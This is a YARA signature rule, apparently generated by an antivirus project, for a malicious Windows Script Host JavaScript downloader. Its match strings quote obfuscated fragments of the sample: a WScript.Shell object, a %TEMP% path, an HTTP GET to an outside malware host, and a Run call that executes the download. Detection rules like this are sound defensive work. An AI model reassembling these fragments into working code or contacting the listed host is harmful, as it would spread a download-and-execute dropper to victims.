rule sig_20160427_c7b465ba2bf9bb86bc3636140957088d {
  meta:
    description = "datamaliciousorder - file 20160427_c7b465ba2bf9bb86bc3636140957088d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "18aa8c3d0b201b6eb381d0135b3508a6b43111bddb53051bac5163b3a69eb916"

  strings:
    $s1  = "function BjoqaGooxf() {return VnvobXjlmo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ykgtuOd" ascii
    $s2  = "function BjoqaGooxf() {return VnvobXjlmo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ykgtuOd" ascii
    $s3  = "function DuhazHzncx(TbtwsUcolp, NyzugDhbas){DrsmaMxysw = DrsmaMxysw * 1; return TbtwsUcolp - NyzugDhbas;};" fullword ascii
    $s4  = "var VnvobXjlmo = function XxbrcQtgur() {return GnumjFbhjb[UfxrrVxvqh](\"WScript\"+\".Shell\");}(), TctgzSkfoy = 11;" fullword ascii
    $s5  = "var GnumjFbhjb = this[\"WScript\"];" fullword ascii
    $s6  = "if (FpxjqGlssw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function PkevbKlmwq(){return PqkraFdvft + \"\";};" fullword ascii
    $s8  = "function NvgwvAsoyh() {return ((LodwjPsnip == true) && (LodwjPsnip == RrilqQluyq)) ? 1 : DrsmaMxysw;};" fullword ascii
    $s9  = "FpxjqGlssw[BpzxeKggpw](\"G\" + \"ET\", \"http://ca-cargo.sk/asl9ks\", false);" fullword ascii
    $s10 = "}while (TnkeyHudic);" fullword ascii
    $s11 = "function SjryrMdxlh(KivykNctud) {var SxudkAapnl = (1, 2, 3, 4, 5, KivykNctud); return SxudkAapnl;};" fullword ascii
    $s12 = "function WgsybDmgba(){return 23;};" fullword ascii
    $s13 = "var RrilqQluyq = false;" fullword ascii
    $s14 = "VtgkmAjifk = true;" fullword ascii
    $s15 = "function IbgmkHxrvn(){return UfxrrVxvqh;};" fullword ascii
    $s16 = "var LodwjPsnip = false;" fullword ascii
    $s17 = "function QoojbSgivr(LizggJxwva){VnvobXjlmo[\"R\"+\"un\"](LizggJxwva, DrsmaMxysw, DrsmaMxysw);};" fullword ascii
    $s18 = "function XlpzmRifrb()" fullword ascii
    $s19 = "return DuhazHzncx(UfpyhByvlo, GgfuhNimhv);" fullword ascii
    $s20 = "var VtgkmAjifk = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}